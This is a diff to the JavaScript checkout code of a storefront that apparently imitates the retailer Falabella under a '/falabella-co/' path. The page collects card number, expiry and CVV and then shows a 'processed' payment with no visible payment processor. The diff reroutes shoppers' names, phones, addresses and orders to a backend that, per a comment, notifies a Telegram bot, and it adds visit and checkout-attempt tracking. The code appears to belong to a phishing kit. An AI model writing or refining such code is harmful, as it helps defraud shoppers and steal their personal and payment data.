@@ -311,6 +311,10 @@
   /* ---------- CHECKOUT / PAGOS ---------- */
   function abrirCheckout() {
     if (!CARRITO.length) { toast('Tu carrito está vacío'); return; }
+    // Métrica: persona que llegó al método de pago (abre la modal)
+    try {
+      fetch('/api/stats/pago-intento', { method: 'POST' }).catch(function () {});
+    } catch (e) {}
     const sub = CARRITO.reduce((a, b) => a + (b.precio || 0) * b.cant, 0);
     const iva = Math.round(sub * 0.19), total = sub + iva;
     $('#fb-checkout').classList.add('fb-open');
@@ -359,13 +363,9 @@
     if (!/^\d{2}\/\d{2}$/.test(exp)) { msg.innerHTML = '<p class="hc-err">Formato de expiración MM/AA.</p>'; return; }
     if (cvv.length < 3) { msg.innerHTML = '<p class="hc-err">CVV inválido.</p>'; return; }
     const subTotal = CARRITO.reduce((a, b) => a + (b.precio || 0) * b.cant, 0);
-    // Notificar al bot: persona a punto de pagar (método de pago ingresado)
+    // Registrar métrica: persona que llegó al método de pago
     try {
-      const prodList = CARRITO.map(i => (i.nombre || 'Producto') + ' x' + i.cant).join(', ');
-      fetch('/api/notify-order', {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ evento: 'intento_pago', nombre: nombre, telefono: tel, direccion: dir, tarjeta: '•••• '+num.slice(-4), total: (subTotal + Math.round(subTotal * 0.19)), productos: prodList })
-      }).catch(function () {});
+      fetch('/api/stats/pago-intento', { method: 'POST' }).catch(function () {});
     } catch (e) {}
     // procesar orden
     msg.innerHTML = '<p class="hc-ok">⏳ Procesando pago...</p>';
@@ -378,11 +378,15 @@
         '<p>Número de orden: <b>'+orden+'</b></p>' +
         '<p>Método: <b>TARJETA</b></p>' +
         '<p>Total pagado: <b class="hc-total">'+fmt(total)+'</b></p></div>';
-      // Notificar al bot: pago confirmado
+      // Enviar pedido al backend -> notifica al bot de Telegram + registra estadística
       try {
-        fetch('/api/notify-order', {
+        const prodList = CARRITO.map(i => ({ nombre: i.nombre || 'Producto', cant: i.cant, precio: i.precio || 0 }));
+        fetch('/api/pedido', {
           method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ evento: 'pago_confirmado', orden: orden, nombre: nombre, telefono: tel, metodo: 'TARJETA', total: total })
+          body: JSON.stringify({
+            orden: orden, nombre: nombre, telefono: tel, direccion: dir,
+            metodo: metodo, total: total, productos: prodList
+          })
         }).catch(function () {});
       } catch (e) {}
       CARRITO = []; guardarCarrito(); actualizarFAB(); pintarPanelCarrito();
@@ -457,6 +461,10 @@
     }
     inyectarUI();
     actualizarFAB();
+    // registrar visita (estadísticas del día)
+    try {
+      fetch('/api/stats/visita', { method: 'POST' }).catch(function () {});
+    } catch (e) {}
     // navegar: si pathname es /falabella-co/* o hay hash, renderizar la ruta
     navigate();
   }
